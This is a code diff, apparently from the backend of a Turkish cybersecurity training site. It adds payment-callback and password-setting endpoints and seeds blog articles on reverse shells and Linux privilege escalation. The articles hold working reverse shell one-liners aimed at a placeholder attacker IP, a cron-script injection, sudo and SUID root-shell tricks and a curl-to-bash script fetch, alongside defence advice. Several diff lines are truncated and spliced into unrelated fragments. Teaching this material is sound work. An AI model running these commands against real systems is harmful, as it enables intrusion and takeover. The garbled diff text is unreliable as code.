+        [order.email, 'PENDING_SET', order.name || 'Yeni Kullanıcı', order.phone || '', plan ? plan.subscription : order.plan_id]
+      );
+      userId = newUser.rows[0].id;
+      await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);
+    }
+
+    // Şifre belirleme token'ı oluştur
+    const passwordToken = crypto.randomBytes(32).toString('hex');
+    const expires = new Date(Date.now() + 72 * 60 * 60 * 1000);
+    await pool.query(
+      'UPDATE users SET password_set_token = $1, password_set_expires = $2 WHERE id = $3',
+      [passwordToken, expires, userId]
+    );
+
+    // Şifre belirleme e-postası gönder
+    const setPasswordLink = `${SITE_URL}/set-password?token=${passwordToken}`;
+    await sendBrevoEmail(
+      order.email, order.name,
+      'Siber Kampüs Akademi — Şifrenizi Belirleyin',
+      buildPasswordSetEmail(order.name || 'Kullanıcı', setPasswordLink)
+    );
+
+    res.json({ status: 'success', message: 'Ödeme simüle edildi, e-posta gönderildi.' });
+  } catch (err) {
+    console.error('Demo complete hatası:', err);
+    res.status(500).json({ error: 'Demo ödeme işlenirken hata oluştu.' });
+  }
+});
+
+// POST /api/checkout/callback — PayTR callback (sunucu-sunucu)
+app.post('/api/checkout/callback', async (req, res) => {
+  try {
+    const { merchant_oid, status, total_amount, hash } = req.body;
+
+    // PayTR hash doğrulama
+    const hashStr = merchant_oid + PAYTR_MERCHANT_SALT + status + total_amount;
+    const expectedHash = crypto.createHmac('sha256', PAYTR_MERCHANT_KEY).update(hashStr).digest('base64');
+    if (hash !== expectedHash) {
+      console.error('PayTR callback hash doğrulama başarısız!');
+      return res.send('OK'); // PayTR her zaman OK bekler
+    }
+
+    // Sipariş kaydını bul
+    const orderResult = await pool.query('SELECT * FROM orders WHERE paytr_merchant_oid = $1', [merchant_oid]);
+    if (orderResult.rows.length === 0) {
+      console.error('Sipariş bulunamadı:', merchant_oid);
+      return res.send('OK');
+    }
+    const order = orderResult.rows[0];
+
+    if (status === 'success') {
+      // Sipariş durumunu güncelle
+      await pool.query('UPDATE orders SET status = $1, paid_at = NOW() WHERE paytr_merchant_oid = $2', ['paid', merchant_oid]);
+
+      // Kullanıcıyı bul veya oluştur
+      let userId;
+      const existingUser = await pool.query('SELECT id, password_hash FROM users WHERE email = $1', [order.email]);
+
+      if (existingUser.rows.length > 0) {
+        // Mevcut kullanıcı — statüs + telefon güncelle
+        userId = existingUser.rows[0].id;
+        const plan = PLANS[order.plan_id];
+        await pool.query(
+          'UPDATE users SET is_premium = true, is_vip = true, subscription = $1, phone = COALESCE(NULLIF($2,\'\'), phone) WHERE id = $3',
+          [plan ? plan.subscription : order.plan_id, order.phone || '', userId]
+        );
+        await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);
+
+        // Şifresi zaten varsa sadece bilgilendirme e-postası gönder
+        if (existingUser.rows[0].password_hash && existingUser.rows[0].password_hash !== 'PENDING_SET') {
+          await sendBrevoEmail(
+            order.email, order.name,
+            'Siber Kampüs Akademi — Eğitiminiz Aktifleştirildi! 🎉',
+            `<div style="font-family:system-ui,sans-serif;max-width:560px;margin:0 auto;background:#020806;color:#cdeede;padding:40px 32px;border-radius:16px;border:1px solid #103a26;">
+              <div style="text-align:center;margin-bottom:32px;">
+                <span style="display:inline-block;width:40px;height:40px;border:2px solid #00ff88;border-radius:10px;line-height:40px;font-size:18px;color:#00ff88;font-family:monospace;font-weight:bold;">&gt;_</span>
+                <span style="font-size:20px;font-weight:700;color:#eafff5;margin-left:12px;vertical-align:middle;">Siber Kampüs <span style="color:#00ff88;">Akademi</span></span>
+              </div>
+              <h1 style="font-size:24px;color:#eafff5;margin:0 0 16px;text-align:center;">Ödemeniz Alındı! 🎉</h1>
+              <p style="color:#9fc4b5;font-size:15px;line-height:1.7;text-align:center;">${order.name}, <strong>${order.plan_name}</strong> eğitim paketiniz başarıyla aktifleştirildi.</p>
+              <div style="text-align:center;margin:32px 0;">
+                <a href="${SITE_URL}" style="display:inline-block;background:#00ff88;color:#021008;font-weight:700;font-size:15px;padding:14px 36px;border-radius:10px;text-decoration:none;">Eğitime Başla →</a>
+              </div>
+              <hr style="border:none;border-top:1px solid #103a26;margin:32px 0;" />
+              <p style="color:#5c8a74;font-size:11px;text-align:center;">© 2026 Siber Kampüs Akademi</p>
+            </div>`
+          );
+          return res.send('OK');
+        }
+      } else {
+        // Yeni kullanıcı oluştur (şifresiz)
+        const plan = PLANS[order.plan_id];
+        const newUser = await pool.query(
+          'INSERT INTO users (email, password_hash, name, phone, is_premium, is_vip, subscription) VALUES ($1, $2, $3, $4, true, true, $5) RETURNING id',
+          [order.email, 'PENDING_SET', order.name || 'Yeni Kullanıcı', order.phone || '', plan ? plan.subscription : order.plan_id]
+        );
+        userId = newUser.rows[0].id;
+        await pool.query('UPDATE orders SET user_id = $1 WHERE id = $2', [userId, order.id]);
+      }
+
+      // Şifre belirleme token'ı oluştur
+      const passwordToken = crypto.randomBytes(32).toString('hex');
+      const expires = new Date(Date.now() + 72 * 60 * 60 * 1000); // 72 saat
+      await pool.query(
+        'UPDATE users SET password_set_token = $1, password_set_expires = $2 WHERE id = $3',
+        [passwordToken, expires, userId]
+      );
+
+      // Şifre belirleme e-postası gönder
+      const setPasswordLink = `${SITE_URL}/set-password?token=${passwordToken}`;
+      await sendBrevoEmail(
+        order.email, order.name,
+        'Siber Kampüs Akademi — Şifrenizi Belirleyin',
+        buildPasswordSetEmail(order.name || 'Kullanıcı', setPasswordLink)
+      );
+
+    } else {
+      // Ödeme başarısız
+      await pool.query('UPDATE orders SET status = $1 WHERE paytr_merchant_oid = $2', ['failed', merchant_oid]);
+    }
+
+    res.send('OK');
+  } catch (err) {
+    console.error('Checkout callback hatası:', err);
+    res.send('OK'); // PayTR her zaman OK bekler
+  }
+});
+
+// POST /api/auth/set-password — Şifre belirleme (ödeme sonrası)
+app.post('/api/auth/set-password', async (req, res) => {
+  const { token, password } = req.body;
+  if (!token || !password) return res.status(400).json({ error: 'Token ve şifre zorunludur.' });
+  if (password.length < 6) return res.status(400).json({ error: 'Şifre en az 6 karakter olmalıdır.' });
+
+  try {
+    const result = await pool.query(
+      'SELECT id, email, name FROM users WHERE password_set_token = $1 AND password_set_expires > NOW()',
+      [token]
+    );
+    if (result.rows.length === 0) {
+      return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş bağlantı. Lütfen destek ile iletişime geçin.' });
+    }
+
+    const user = result.rows[0];
+    const passwordHash = await bcrypt.hash(password, 10);
+
+    await pool.query(
+      'UPDATE users SET password_hash = $1, password_set_token = NULL, password_set_expires = NULL WHERE id = $2',
+      [passwordHash, user.id]
+    );
+
+    // Direkt giriş yapması için JWT token üret
+    const payload = await getUserPayload(user.id);
+    const jwtToken = jwt.sign({ id: payload.id, email: payload.email }, JWT_SECRET, { expiresIn: '7d' });
+
+    res.json({ token: jwtToken, user: payload });
+  } catch (err) {
+    console.error('Set password hatası:', err);
+    res.status(500).json({ error: 'Şifre belirlenirken bir hata oluştu.' });
+  }
+});
+
+// GET /api/checkout/status/:oid — Ödeme durumu sorgula
+app.get('/api/checkout/status/:oid', async (req, res) => {
+  try {
+    const result = await pool.query('SELECT status, plan_id, plan_name, amount, paid_at FROM orders WHERE paytr_merchant_oid = $1', [req.params.oid]);
+    if (result.rows.length === 0) return res.status(404).json({ error: 'Sipariş bulunamadı.' });
+    res.json(result.rows[0]);
+  } catch (err) {
+    res.status(500).json({ error: 'Durum sorgulanırken hata oluştu.' });
   }
 });
 
@@ -1441,7 +2001,9 @@ async function initDatabase() {
           seo_title: 'Reverse Shell Nedir? Netcat, Bash, Python Örnekleri ve Tespit Yöntemleri',
           meta_description: 'Reverse shell nedir, nasıl çalışır? Netcat, Bash, Python ve PHP reverse shell örnekleri. Tespit ve savunma stratejileri.',
           focus_keywords: 'reverse shell nedir, reverse shell örnekleri, netcat reverse shell, reverse shell tespit, post exploitation',
-          content: '<h2>Reverse Shell Nedir?</h2><p><strong>Reverse shell</strong>, hedef sistemin saldırganın makinesine geri bağlantı kurduğu bir uzaktan erişim tekniğidir. Normal bir shell bağlantısında (bind shell) saldırgan hedefe bağlanırken, reverse shell\'de hedef saldırgana bağlanır. Bu yaklaşım güvenlik duvarlarını atlamak için kritik öneme sahiptir.</p><h2>Neden Reverse Shell Kullanılır?</h2><ul><li><strong>Güvenlik duvarı bypass:</strong> Çoğu firewall gelen bağlantıları engeller ama giden bağlantılara izin verir</li><li><strong>NAT arkasındaki hedefler:</strong> Özel IP\'li sistemlere doğrudan erişim mümkün olmadığında</li><li><strong>Post-exploitation:</strong> İlk erişim sağlandıktan sonra kalıcı bağlantı kurmak için</li></ul><h2>Reverse Shell Nasıl Çalışır?</h2><p>İki aşamadan oluşur:</p><ol><li><strong>Dinleyici (Listener):</strong> Saldırgan kendi makinesinde belirli bir portu dinlemeye alır</li><li><strong>Payload:</strong> Hedef sistemde çalışan kod, saldırganın IP\'sine geri bağlantı kurar</li></ol><h2>Popüler Reverse Shell Örnekleri</h2><h3>1. Netcat Reverse Shell</h3><pre><code># Saldırgan tarafı (listener)\nnc -lvnp 4444\n\n# Hedef tarafı\nnc -e /bin/bash SALDIRGAN_IP 4444</code></pre><h3>2. Bash Reverse Shell</h3><pre><code>bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1</code></pre><h3>3. Python Reverse Shell</h3><pre><code>python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("SALDIRGAN_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'</code></pre><h3>4. PHP Reverse Shell</h3><pre><code>&lt;?php exec("/bin/bash -c \'bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1\'"); ?&gt;</code></pre><h3>5. PowerShell Reverse Shell (Windows)</h3><pre><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'SALDIRGAN_IP\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre><h2>Shell Yükseltme (Shell Upgrade)</h2><p>Temel reverse shell\'ler sınırl�        {
+          content: '<h2>Reverse Shell Nedir?</h2><p><strong>Reverse shell</strong>, hedef sistemin saldırganın makinesine geri bağlantı kurduğu bir uzaktan erişim tekniğidir. Normal bir shell bağlantısında (bind shell) saldırgan hedefe bağlanırken, reverse shell\'de hedef saldırgana bağlanır. Bu yaklaşım güvenlik duvarlarını atlamak için kritik öneme sahiptir.</p><h2>Neden Reverse Shell Kullanılır?</h2><ul><li><strong>Güvenlik duvarı bypass:</strong> Çoğu firewall gelen bağlantıları engeller ama giden bağlantılara izin verir</li><li><strong>NAT arkasındaki hedefler:</strong> Özel IP\'li sistemlere doğrudan erişim mümkün olmadığında</li><li><strong>Post-exploitation:</strong> İlk erişim sağlandıktan sonra kalıcı bağlantı kurmak için</li></ul><h2>Reverse Shell Nasıl Çalışır?</h2><p>İki aşamadan oluşur:</p><ol><li><strong>Dinleyici (Listener):</strong> Saldırgan kendi makinesinde belirli bir portu dinlemeye alır</li><li><strong>Payload:</strong> Hedef sistemde çalışan kod, saldırganın IP\'sine geri bağlantı kurar</li></ol><h2>Popüler Reverse Shell Örnekleri</h2><h3>1. Netcat Reverse Shell</h3><pre><code># Saldırgan tarafı (listener)\nnc -lvnp 4444\n\n# Hedef tarafı\nnc -e /bin/bash SALDIRGAN_IP 4444</code></pre><h3>2. Bash Reverse Shell</h3><pre><code>bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1</code></pre><h3>3. Python Reverse Shell</h3><pre><code>python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("SALDIRGAN_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'</code></pre><h3>4. PHP Reverse Shell</h3><pre><code>&lt;?php exec("/bin/bash -c \'bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1\'"); ?&gt;</code></pre><h3>5. PowerShell Reverse Shell (Windows)</h3><pre><code>powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'SALDIRGAN_IP\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'&gt; \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></pre><h2>Shell Yükseltme (Shell Upgrade)</h2><p>Temel reverse shell\'ler sınırlıdır. Tam interaktif TTY shell için:</p><pre><code># Python ile TTY spawn\npython3 -c \'import pty; pty.spawn("/bin/bash")\'\n\n# Ctrl+Z ile arka plana al, ardından:\nstty raw -echo; fg\nexport TERM=xterm</code></pre><h2>Tespit ve Savunma</h2><h3>Tespit Yöntemleri</h3><ul><li><strong>Network monitoring:</strong> Olağandışı giden bağlantıları izleyin</li><li><strong>Process monitoring:</strong> <code>/bin/bash</code> veya <code>cmd.exe</code>\'nin ağ soketi açmasını takip edin</li><li><strong>EDR çözümleri:</strong> CrowdStrike, SentinelOne gibi araçlar reverse shell aktivitesini algılar</li></ul><h3>Savunma Stratejileri</h3><ul><li>Giden bağlantıları güvenlik duvarında sınırlayın (egress filtering)</li><li>Gereksiz yorumlayıcıları (Python, Perl, nc) sistemden kaldırın</li><li>Uygulama whitelisting uygulayın</li><li>Ağ segmentasyonu yapın</li></ul><h2>Sonuç</h2><p>Reverse shell, sızma testlerinin vazgeçilmez bir aracıdır. Güvenlik uzmanları bu teknikleri hem saldırı hem de savunma perspektifinden anlamalıdır.</p><blockquote>siberkampus Sistem Sömürüsü laboratuvarlarında reverse shell tekniklerini güvenli ortamda uygulayın.</blockquote>'
+        },
+        {
           title: 'Linux Ayrıcalık Yükseltme Rehberi: Temelden İleri Seviyeye',
           slug: 'linux-ayricalik-yukseltme-rehberi',
           excerpt: 'Linux sistemlerde ayrıcalık yükseltme (privilege escalation) tekniklerini adım adım öğrenin: SUID sömürüsü, sudo bypass, cron görevleri ve kernel açıkları.',
@@ -1451,8 +2013,7 @@ async function initDatabase() {
           seo_title: 'Linux Ayrıcalık Yükseltme (Privilege Escalation) Rehberi | siberkampus',
           meta_description: 'Linux sistemlerde SUID, sudo yetkileri, cron görevleri ve kernel açıklarıyla yetki yükseltme (root olma) tekniklerini uygulamalı örneklerle öğrenin.',
           focus_keywords: 'linux ayrıcalık yükseltme, linux privilege escalation, suid sömürüsü, root olma, linux yetki yükseltme',
-          content: '<h2>Linux Ayrıcalık Yükseltme (Privilege Escalation) Nedir?</h2><p><strong>Privilege Escalation (Ayrıcalık Yükseltme)</strong>, düşük yetkili bir kullanıcı hesabından daha yüksek yetkilere — genellikle <code>root</code> erişimine — geçiş sürecidir. Sızma testlerinin en kritik aşamalarından biridir.</p><h2>Temel Keşif Komutları</h2><p>Yetki yükseltme öncesi sistem hakkında bilgi toplamak gerekir:</p><pre><code># Kullanıcı bilgisi\nwhoami && id\n\n# İşletim sistemi bilgisi\nuname -a && cat /etc/os-release\n\n# SUID dosyaları\nfind / -perm -4000 -type f 2>/dev/null\n\n# Yazılabilir dosyalar\nfind / -writable -type f 2>/dev/null\n\n# Cron görevleri\ncat /etc/crontab && ls -la /etc/cron.*\n\n# Sudo yetkileri\nsudo -l</code></pre><h2>Ayrıcalık Yükseltme Teknikleri</h2><h3>1. SUID Bit Sömürüsü</h3><p>SUID (Set User ID) bit ayarlı dosyalar, çalıştırıldığında dosya sahibinin yetkileriyle çalışır. Root\'a ait SUID dosyası bulunursa root komutu çalıştırılabilir:</p><pre><code># SUID dosyalarını bul\nfind / -perm -u=s -type f 2>/dev/null\n\n# Örnek: /usr/bin/find SUID ise\nfind . -exec /bin/bash -p \\; -quit</code></pre><p><strong>GTFOBins</strong> sitesinden hangi SUID binary\'lerinin sömürülebileceğini kontrol edin.</p><h3>2. Sudo Yanlış Yapılandırması</h3><p><code>sudo -l</code> komutunun çıktısı kritik bilgiler verir:</p><pre><code># Eğer şu çıktıyı alırsanız:\n(ALL) NOPASSWD: /usr/bin/vim\n\n# Root shell almak için:\nsudo vim -c \'!bash\'</code></pre><h3>3. Cron Job Sömürüsü</h3><p>Root tarafından çalıştırılan cron görevlerinin scriptleri düzenlenebilirse:</p><pre><code># Root cron\'u kontrol et\ncat /etc/crontab\n\n# Eğer /opt/backup.sh root tarafından çalışıyorsa ve yazılabilirse:\necho \'bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1\' >> /opt/backup.sh</code></pre><h3>4. Kernel Exploit</h3><p>Eski kernel sürümleri bilinen güvenlik açıklarına sahip olabilir:</p><table><tr><th>CVE</th><th>İsim</th><th>Etkilenen Kernel</th></tr><tr><td>CVE-2016-5195</td><td>Dirty COW</td><td>2.x - 4.x</td></tr><tr><td>CVE-2021-4034</td><td>PwnKit</td><td>Tüm polkit sürümleri</td></tr><tr><td>CVE-2022-0847</td><td>Dirty Pipe</td><td>5.8 - 5.16</td></tr></table><h3>5. PATH Hijacking</h3><p>SUID programı tam yol belirtmeden komut çağırıyorsa PATH değişkeni manipüle edilebilir:</p><pre><code>echo \'/bin/bash\' > /tmp/ps\nchmod +x /tmp/ps\nexport PATH=/tmp:$PATH\n# SUID programını çalıştır</code></pre><h2>Otomatik Araçlar</h2><ul><li><strong>LinPEAS:</strong> En kapsamlı Linux enumeration scripti</li><li><strong>LinEnum:</strong> Hızlı sistem keşif aracı</li><li><strong>linux-exploit-suggester:</strong> Kernel exploit önerici</li></ul><pre><code># LinPEAS kullanımı\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code></pre><h2>Savunma Önerileri</h2><ul><li>Gereksiz SUID bitlerini kaldırın</li><li>Sudo yetkilerini minimum tutun</li><li>Kernel\'i güncel tutun</li><li>Cron scriptlerinin izinlerini sıkılaştırın</li><li>Dosya bütünlüğü izleme (AIDE, Tripwire) kullanın</li></ul><h2>Sonuç</h2><p>Linux ayrıcalık yükseltme, sızma testçileri için temel bir beceridir. Sistematik bir keşif süreci ve doğru tekniklerle düşük yetkili erişimden tam kontrol elde edilebilir.</p><blockquote>siberkampus Sistem Sömürüsü laboratuvarlarında bu teknikleri uygulayarak deneyim kazanabilirsiniz.</blockquote>'
-        },x - 4.x</td></tr><tr><td>CVE-2021-4034</td><td>PwnKit</td><td>Tüm polkit sürümleri</td></tr><tr><td>CVE-2022-0847</td><td>Dirty Pipe</td><td>5.8 - 5.16</td></tr></table><h3>5. PATH Hijacking</h3><p>SUID programı tam yol belirtmeden komut çağırıyorsa PATH değişkeni manipüle edilebilir:</p><pre><code>echo \'/bin/bash\' > /tmp/ps\nchmod +x /tmp/ps\nexport PATH=/tmp:$PATH\n# SUID programını çalıştır</code></pre><h2>Otomatik Araçlar</h2><ul><li><strong>LinPEAS:</strong> En kapsamlı Linux enumeration scripti</li><li><strong>LinEnum:</strong> Hızlı sistem keşif aracı</li><li><strong>linux-exploit-suggester:</strong> Kernel exploit önerici</li></ul><pre><code># LinPEAS kullanımı\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code></pre><h2>Savunma Önerileri</h2><ul><li>Gereksiz SUID bitlerini kaldırın</li><li>Sudo yetkilerini minimum tutun</li><li>Kernel\'i güncel tutun</li><li>Cron scriptlerinin izinlerini sıkılaştırın</li><li>Dosya bütünlüğü izleme (AIDE, Tripwire) kullanın</li></ul><h2>Sonuç</h2><p>Linux ayrıcalık yükseltme, sızma testçileri için temel bir beceridir. Sistematik bir keşif süreci ve doğru tekniklerle düşük yetkili erişimden tam kontrol elde edilebilir.</p><blockquote>siberkampus Sistem Sömürüsü laboratuvarlarında bu teknikleri uygulamalı olarak deneyimleyin.</blockquote>'
+          content: '<h2>Linux Ayrıcalık Yükseltme (Privilege Escalation) Nedir?</h2><p><strong>Privilege Escalation (Ayrıcalık Yükseltme)</strong>, düşük yetkili bir kullanıcı hesabından daha yüksek yetkilere — genellikle <code>root</code> erişimine — geçiş sürecidir. Sızma testlerinin en kritik aşamalarından biridir.</p><h2>Temel Keşif Komutları</h2><p>Yetki yükseltme öncesi sistem hakkında bilgi toplamak gerekir:</p><pre><code># Kullanıcı bilgisi\nwhoami && id\n\n# İşletim sistemi bilgisi\nuname -a && cat /etc/os-release\n\n# SUID dosyaları\nfind / -perm -4000 -type f 2>/dev/null\n\n# Yazılabilir dosyalar\nfind / -writable -type f 2>/dev/null\n\n# Cron görevleri\ncat /etc/crontab && ls -la /etc/cron.*\n\n# Sudo yetkileri\nsudo -l</code></pre><h2>Ayrıcalık Yükseltme Teknikleri</h2><h3>1. SUID Bit Sömürüsü</h3><p>SUID (Set User ID) bit ayarlı dosyalar, çalıştırıldığında dosya sahibinin yetkileriyle çalışır. Root\'a ait SUID dosyası bulunursa root komutu çalıştırılabilir:</p><pre><code># SUID dosyalarını bul\nfind / -perm -u=s -type f 2>/dev/null\n\n# Örnek: /usr/bin/find SUID ise\nfind . -exec /bin/bash -p \\; -quit</code></pre><p><strong>GTFOBins</strong> sitesinden hangi SUID binary\'lerinin sömürülebileceğini kontrol edin.</p><h3>2. Sudo Yanlış Yapılandırması</h3><p><code>sudo -l</code> komunun çıktısı kritik bilgiler verir:</p><pre><code># Eğer şu çıktıyı alırsanız:\n(ALL) NOPASSWD: /usr/bin/vim\n\n# Root shell almak için:\nsudo vim -c \'!bash\'</code></pre><h3>3. Cron Job Sömürüsü</h3><p>Root tarafından çalıştırılan cron görevlerinin scriptleri düzenlenebilirse:</p><pre><code># Root cron\'u kontrol et\ncat /etc/crontab\n\n# Eğer /opt/backup.sh root tarafından çalışıyorsa ve yazılabilirse:\necho \'bash -i >& /dev/tcp/SALDIRGAN_IP/4444 0>&1\' >> /opt/backup.sh</code></pre><h3>4. Kernel Exploit</h3><p>Eski kernel sürümleri bilinen güvenlik açıklarına sahip olabilir:</p><table><tr><th>CVE</th><th>İsim</th><th>Etkilenen Kernel</th></tr><tr><td>CVE-2016-5195</td><td>Dirty COW</td><td>2.x - 4.x</td></tr><tr><td>CVE-2021-4034</td><td>PwnKit</td><td>Tüm polkit sürümleri</td></tr><tr><td>CVE-2022-0847</td><td>Dirty Pipe</td><td>5.8 - 5.16</td></tr></table><h3>5. PATH Hijacking</h3><p>SUID programı tam yol belirtmeden komut çağırıyorsa PATH değişkeni manipüle edilebilir:</p><pre><code>echo \'/bin/bash\' > /tmp/ps\nchmod +x /tmp/ps\nexport PATH=/tmp:$PATH\n# SUID programını çalıştır</code></pre><h2>Otomatik Araçlar</h2><ul><li><strong>LinPEAS:</strong> En kapsamlı Linux enumeration scripti</li><li><strong>LinEnum:</strong> Hızlı sistem keşif aracı</li><li><strong>linux-exploit-suggester:</strong> Kernel exploit önerici</li></ul><pre><code># LinPEAS kullanımı\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code></pre><h2>Savunma Önerileri</h2><ul><li>Gereksiz SUID bitlerini kaldırın</li><li>Sudo yetkilerini minimum tutun</li><li>Kernel\'i güncel tutun</li><li>Cron scriptlerinin izinlerini sıkılaştırın</li><li>Dosya bütünlüğü izleme (AIDE, Tripwire) kullanın</li></ul><h2>Sonuç</h2><p>Linux ayrıcalık yükseltme, sızma testçileri için temel bir beceridir. Sistematik bir keşif süreci ve doğru tekniklerle düşük yetkili erişimden tam kontrol elde edilebilir.</p><blockquote>siberkampus Sistem Sömürüsü laboratuvarlarında bu teknikleri uygulamalı olarak deneyimleyin.</blockquote>'
         },
         {
           title: 'Phishing Saldırıları: Sosyal Mühendislik Tekniklerini Tanıma ve Savunma',
